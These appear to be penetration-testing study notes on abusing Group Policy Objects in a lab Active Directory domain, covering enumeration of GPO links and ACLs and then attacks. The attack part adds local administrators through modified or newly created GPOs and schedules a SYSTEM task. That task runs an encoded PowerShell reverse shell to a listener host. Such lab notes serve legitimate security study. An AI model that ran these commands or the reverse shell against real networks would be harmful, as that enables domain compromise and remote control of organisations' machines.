## What are?
 Group Policy Object (GPO) is a collection of policy settings defining the appearance and behavior of systems for a specific group of users or computers within an organization.


## GPO Links
Gpo links can have several meanings like the path where they are hosted but also a number(at the end) that defines the status of the GPO itself.
- 0 - The GPO is enabled.
- 1 - The GPO is disabled.
- 2 - The GPO link is enforced.
- 3 - The GPO link is enforced, but the GPO is disabled.

Long story short, "GPLinks" are the link where the GPO is stored in SYSVOL/NETLOGON. 


# How to enumerate?
## Linux Friendly
You can do it from Linux.
```shell-session
python3 GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -listgpo
```
Or you can use the powerview.py to get the list of GPO in the domain.
We can check the GPO links as well.
```shell-session
 python3 GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -listgplink
        GPO Helper - @TheXC3LL
```
To get the right associated to a gpo first we need the GUID of all the GPOs.
```shell-session
proxychains4 -q python3 GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -listgpo | grep " Name:"
[+] Name: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Name: {6AC1786C-016F-11D2-945F-00C04fB984F9}
[+] Name: {EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D}
[+] Name: {8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756}
```
Next we need to parse it
```shell-session
 python3 examples/dacledit.py inlanefreight.local/gabriel:Godisgood001 -target-dn "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=inlanefreight,DC=local" -dc-ip 172.16.92.10                       
Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL                  
[*] Printing parsed DACL              
[*] ACE[0] info                 
[*]  ACE Type         : ACCESS_ALLOWED_OBJECT_ACE      
[*]  ACE flags        : CONTAINER_INHERIT_ACE      
[*]  Access mask       : ControlAccess
[*]  Flags          : ACE_OBJECT_TYPE_PRESENT
[*]  Object type (GUID)    : Apply-Group-Policy (edacfd8f-ffb3-11d1-b41d-00a0c968f939)
[*]  Trustee (SID)      : Authenticated Users (S-1-5-11)                   
[*] ACE[1] info                                            
[*]  ACE Type         : ACCESS_ALLOWED_ACE                         
[*]  ACE flags        : None                                
[*]  Access mask       : ReadAndExecute (0xe00bd)                  
[*]  Trustee (SID)      : Domain Admins (S-1-5-21-831407601-1803900599-2479021482-512)    
[*] ACE[2] info                                            
[*]  ACE Type         : ACCESS_ALLOWED_ACE 
[*]  ACE flags        : None                                
[*]  Access mask       : ReadAndExecute (0xe00bd)                  
[*]  Trustee (SID)      : Enterprise Admins (S-1-5-21-831407601-1803900599-2479021482-519)  
[*] ACE[3] info                    
[*]  ACE Type         : ACCESS_ALLOWED_ACE 
[*]  ACE flags        : CONTAINER_INHERIT_ACE 
[*]  Access mask       : ReadControl, WriteProperties, ReadProperties, ListChildObjects, DeleteChild, CreateChild (0x20037)
[*]  Trustee (SID)      : Server Admins (S-1-5-21-831407601-1803900599-2479021482-1604)
```

## Windows Friendly
In Windows the story is a bit easier 
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainGPO | Select-Object -First 1
```
We can see the links as well.
```powershell-session
Get-DomainObject -SearchScope Base -Properties gplink

gplink
------
[LDAP://cn={31B2F340-016D-11D2-945F-00C04FB984F9},cn=policies,cn=system,DC=inlanefreight,DC=local;0]
```
Now we need to understand the rights that we have over it.
```powershell-session
Get-DomainGPO | Select-Object -First 1 | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' }

AceType       : AccessAllowed
ObjectDN       : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=inlanefreight,DC=local
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
OpaqueLength     : 0
ObjectSID      :
InheritanceFlags   : ContainerInherit
BinaryLength     : 36
IsInherited     : False
IsCallback      : False
PropagationFlags   : None
SecurityIdentifier  : S-1-5-21-831407601-1803900599-2479021482-1604
AccessMask      : 131127
AuditFlags      : None
AceFlags       : ContainerInherit
AceQualifier     : AccessAllowed
```
Take the **SecurityIntentifier** and convert it back to human language.
```powershell-session
ConvertFrom-SID S-1-5-21-831407601-1803900599-2479021482-1604
INLANEFREIGHT\Server Admins
```


# Attacks
## From Linux
On Linux you will need to list all available GPOs in domain.
```shell-session
python3 GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -listgpo

[+] Name: {8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756}
	[-] displayName: TechSupport Management
	[-] gPCFileSysPath: \\inlanefreight.local\SysVol\inlanefreight.local\Policies\{8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756}
	[-] gPCMachineExtensionNames: [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
	[-] versionNumber: 4
	[-] Verbose: 
		---		---
		Security
		Computer Restricted Groups

```
Now you need to backtrack the gpolinks to which gpo is pointing to.
```shell-session
python3 GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -listgplink
[+] Name: Servers
	[-] distinguishedName: OU=Servers,DC=inlanefreight,DC=local
	[-] gPLink: [LDAP://cn={8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756},cn=policies,cn=system,DC=inlanefreight,DC=local;1]
```
<font color="#c00000">In this example the link is disabled(1 at the end) but is linked to TechSupport gpo cause it shares the same **ID**.</font>
Next is to enumerate rights and easiest is absolutely *Bloodhound* otherwise if you want to do it manually via *dacledit.py*.
But the attack can be done in Linux with the *partial* Python implementation https://github.com/Hackndo/pyGPOAbuse
It is always good praxis to backup the GPO first, so we can rollback later on.
```shell-session
 python3 GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -backup backupgpo -name "{31B2F340-016D-11D2-945F-00C04FB984F9}"
```
Next can we edit the GPO to execute some DOS command that adds a new user to local admins.
```shell-session
python3 pygpoabuse.py inlanefreight.local/gabriel:Godisgood001 -gpo-id EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D -command "net user plaintext Password1234 /add && net localgroup Administrators plaintext /add" -taskname "PT_LocalAdmin" -description "this is a GPO test" -dc-ip 172.16.92.10 -v
```
<font color="#c00000">(**Remember** that this tool is partially implemented and is not supporting creation of new GPOs, linking gplinks etc, in that case please use the Windows counterpart SharpGPOAbuse.)</font>

## From Windows
We must first identify a domain user that have the rights to create/edit GPOs. We can use this tool to automate the process. [Get-GPOEnumeration.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/Get-GPOEnumeration.ps1)
<font color="#c00000">**Remember** it can check permissions for modifying GPOs with the parameter `-ModifyGPOs,` permission to link GPOs with `-LinkGPOs`, and permission to create GPOs with `-CreateGPO.`</font>
```powershell-session
Import-Module .\Powerview.ps1
Import-Module .\Get-GPOEnumeration.ps1
Get-GPOEnumeration
Enumerating GPOs and their applied scopes...

PrincipalName    : Server Admins
GPOName       : Default Domain Policy
GPCFileSysPath    : \\inlanefreight.local\sysvol\inlanefreight.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
AppliedScopes    : Domain: inlanefreight
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
ObjectDN       : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=inlanefreight,DC=local
...SNIP...
```
Now that we identified a valid GPO we can use tool [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to perform the abuse.
```powershell-session
//Create a new dummy GPO
New-GPO -Name Culo -Comment "This is a test GPO."


//Editing the GPO to add a local admin
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Gabriel --GPOName "Culo"
[+] Domain = inlanefreight.local
[+] Domain Controller = DC02.inlanefreight.local
[+] Distinguished Name = CN=Policies,CN=System,DC=inlanefreight,DC=local
[+] SID Value of Gabriel = S-1-5-21-831407601-1803900599-2479021482-1106
[+] GUID of "Culo" is: {36D9D81F-D637-464A-93A6-FB23FBF173EE}
[+] Creating file \\inlanefreight.local\SysVol\inlanefreight.local\Policies\{36D9D81F-D637-464A-93A6-FB23FBF173EE}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.

//OR getting a revshell as NTSystem on the victim
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Shell as NTSystem" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADQAIgAsADQANAA1ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" --GPOName "Culo"


//Linking the gpo to the victim OU
New-GPLink -Name "Culo" -Target "OU=Servers,DC=inlanefreight,DC=local"
GpoId       : 36d9d81f-d637-464a-93a6-fb23fbf173ee
DisplayName : Culo
Enabled     : True
Enforced    : False
Target      : OU=Servers,DC=inlanefreight,DC=local
Order       : 2
```
<font color="#c00000">(In this example a new gpo is created, injected with malicious code to gain access as Gabriel as local admin and linked to the Servers OU).</font>
Except the local admin the tool supports even the following options.

| Option              | Description                          |
| ------------------- | ------------------------------------ |
| --AddUserRights     | Add rights to a user                 |
| --AddLocalAdmin     | Add a user to the local admins group |
| --AddComputerScript | Add a new computer startup script    |
| --AddUserScript     | Configure a user logon script        |
| --AddComputerTask   | Configure a computer immediate task  |
| --AddUserTask       | Add an immediate task to a user      |
